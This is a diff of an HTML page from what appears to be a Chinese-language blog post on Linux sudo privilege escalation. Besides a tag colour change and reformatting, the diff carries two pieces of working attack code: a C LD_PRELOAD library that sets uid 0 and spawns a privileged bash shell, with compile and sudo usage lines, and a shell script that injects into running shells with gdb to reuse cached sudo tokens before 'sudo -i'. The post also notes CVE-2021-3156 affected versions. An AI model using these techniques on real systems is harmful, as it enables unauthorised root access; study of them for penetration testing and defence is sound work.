@@ -260,7 +260,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/%E6%8F%90%E6%9D%83/" style="color: #00a596">提权</a>
+                <a href="/blog/tags/%E6%8F%90%E6%9D%83/" style="color: #ff7d73">提权</a>
             </span>
             
         </span>
@@ -334,18 +334,21 @@
 <li><p>绕过路径：配置 sudoers 时对目录使用了通配符，可使用 <code>..</code> 进行目录穿越</p>
 </li>
 <li><p>LD_PRELOAD：需要配置<code>env_keep+=LD_PRELOAD</code>在 sudo 执行时保留 LD_PRELOAD 环境变量</p>
+</li>
+</ul>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;sys/types.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>
 <span class="token keyword">void</span> <span class="token function">_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-	<span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//不让环境变量重置,保持使用现在的共享库</span>
-	<span class="token function">setresuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/bash -p"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//不让环境变量重置,保持使用现在的共享库</span>
+<span class="token function">setresuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/bash -p"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 
 <span class="token comment">// gcc -shared -fPIC -o shell.so shell.c -nostartfiles</span>
 <span class="token comment">// sudo LD_PRELOAD=/tmp/shell.so 免密sudo命令</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-</li>
+
+<ul>
 <li><p>caching提权</p>
 <blockquote>
 <p>用户第一次使用sudo命令时，系统会提示用户输入密码，然后将用户的身份验证信息缓存起来，通常在 15 分钟内（可以通过在配置文件中修改 <code>timestamp_timeout</code> 参数来修改缓存时间）。用户在此时间内无需再次输入密码就可以执行 sudo 命令，从而提高效率。不过，sudo  缓存也有一些安全风险。如果渗透测试人员能够获得此用户的权限，那么在 sudo  缓存时间内，他们就可以无须输入密码执行sudo命令，从而获得更高的权限</p>
@@ -368,6 +371,8 @@
 <li>当文件内容为 2 时，禁止所有进程被追踪。</li>
 </ul>
 <p>如果当前系统的 <code>ptrace_scope</code> 值设置为 0，并且此时有用户使用 sudo 来执行命令，则可以尝试激活 <code>/var/lib/sudo/ts/</code> 目录下的所有 sudo 会话的令牌，注入具有有效 sudo 令牌的进程并激活我们自己的 sudo 令牌</p>
+</li>
+</ul>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>
 
 <span class="token comment"># create an invalid sudo entry for the current shell</span>
@@ -379,15 +384,13 @@
 <span class="token comment"># inject all shell belonging to the current user, our shell one :p</span>
 <span class="token keyword">for</span> <span class="token for-or-select variable">pid</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span>pgrep <span class="token string">'^(ash|ksh|csh|dash|bash|zsh|tcsh|sh)$'</span> <span class="token parameter variable">-u</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">id</span> <span class="token parameter variable">-u</span><span class="token variable">)</span></span>"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"^<span class="token variable">$$</span>\$"</span><span class="token variable">)</span></span>
 <span class="token keyword">do</span>
-        <span class="token builtin class-name">echo</span> <span class="token string">"Injecting process <span class="token variable">$pid</span> -> "</span><span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> <span class="token string">"/proc/<span class="token variable">$pid</span>/comm"</span><span class="token variable">)</span></span>
-        <span class="token builtin class-name">echo</span> <span class="token string">'call system("echo | sudo -S /tmp/activate_sudo_token /var/lib/sudo/ts/* >/dev/null 2>&amp;1")'</span> <span class="token punctuation">\</span>
-                <span class="token operator">|</span> gdb <span class="token parameter variable">-q</span> <span class="token parameter variable">-n</span> <span class="token parameter variable">-p</span> <span class="token string">"<span class="token variable">$pid</span>"</span> <span class="token operator">></span>/dev/null <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span>
+	  <span class="token builtin class-name">echo</span> <span class="token string">"Injecting process <span class="token variable">$pid</span> -> "</span><span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> <span class="token string">"/proc/<span class="token variable">$pid</span>/comm"</span><span class="token variable">)</span></span>
+	  <span class="token builtin class-name">echo</span> <span class="token string">'call system("echo | sudo -S /tmp/activate_sudo_token /var/lib/sudo/ts/* >/dev/null 2>&amp;1")'</span> <span class="token punctuation">\</span>
+			  <span class="token operator">|</span> gdb <span class="token parameter variable">-q</span> <span class="token parameter variable">-n</span> <span class="token parameter variable">-p</span> <span class="token string">"<span class="token variable">$pid</span>"</span> <span class="token operator">></span>/dev/null <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span>
 <span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>这段代码的效果是，在执行sudo命令时需要输入密码的情况下调用<code>/tmp/activate_sudo_token</code>程序，注入所有正在运行的 Shell 进程中，并传入<code>/var/lib/sudo/ts/</code>目录下，所有文件的路径为此程序参数，并且不会有其他输出，直到寻找到有效的 sudo 令牌进程，最后使用此 sudo 命令激活当前进程</p>
-<p>在脚本完成注入后执行<code>sudo -i</code>即可完成提权</p>
-</li>
-</ul>
+<p>  这段代码的效果是，在执行sudo命令时需要输入密码的情况下调用<code>/tmp/activate_sudo_token</code>程序，注入所有正在运行的 Shell 进程中，并传入<code>/var/lib/sudo/ts/</code>目录下，所有文件的路径为此程序参数，并且不会有其他输出，直到寻找到有效的 sudo 令牌进程，最后使用此 sudo 命令激活当前进程</p>
+<p>  在脚本完成注入后执行<code>sudo -i</code>即可完成提权</p>
 <h3 id="CVE-2021-3156"><a href="#CVE-2021-3156" class="headerlink" title="CVE-2021-3156"></a>CVE-2021-3156</h3><p>参考：<a target="_blank" rel="noopener" href="https://help.aliyun.com/zh/ecs/product-overview/vulnerability-announcement-or-linux-sudo-permission-vulnerability">https://help.aliyun.com/zh/ecs/product-overview/vulnerability-announcement-or-linux-sudo-permission-vulnerability</a></p>
 <p>受影响版本：1.8.2 - 1.8.31p2、1.9.0 - 1.9.5p1</p>
 <p>检验方法：</p>
